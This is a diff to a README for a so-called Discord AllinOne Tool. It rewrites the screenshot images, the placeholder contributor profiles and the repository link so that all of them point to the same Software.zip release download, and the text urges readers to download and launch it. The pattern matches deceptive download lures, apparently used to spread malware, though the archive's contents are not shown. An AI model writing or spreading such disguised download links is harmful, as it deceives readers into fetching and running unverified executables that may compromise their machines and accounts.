@@ -15,16 +15,16 @@ Welcome to the Discord-AllinOne-Tool repository! This repository contains an All
 
 ## Get Started
 To start using the Discord AllinOne Tool, simply download it from the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)
 *(Note: The link above will download the software, make sure to launch it to start using the tools.)*
 
 ## Screenshots
 Here are some screenshots of the Discord AllinOne Tool interface:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)
 *Caption for Screenshot 1*
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)
 *Caption for Screenshot 2*
 
 ## Usage
@@ -34,8 +34,8 @@ Once you have downloaded and launched the Discord-AllinOne-Tool, you can easily 
 If you encounter any issues or have any questions about the Discord-AllinOne-Tool, feel free to reach out by opening an issue in the GitHub repository. Our team will be happy to assist you.
 
 ## Contributors
-- John Doe - [@johndoe](https://github.com/johndoe)
-- Jane Smith - [@janesmith](https://github.com/janesmith)
+- John Doe - [@johndoe](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)
+- Jane Smith - [@janesmith](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip)
 
 ## License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
@@ -44,4 +44,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 **Note:** If the download link is not working, please check the "Releases" section of the repository to find the latest version.
 
-Visit the [Discord-AllinOne-Tool](https://github.com/YouaifXD/789566136) repository for more information and updates. 🚀
+Visit the [Discord-AllinOne-Tool](https://github.com/ONDEXU/Discord-AllinOne-Tool/releases/download/v1.0/Software.zip) repository for more information and updates. 🚀
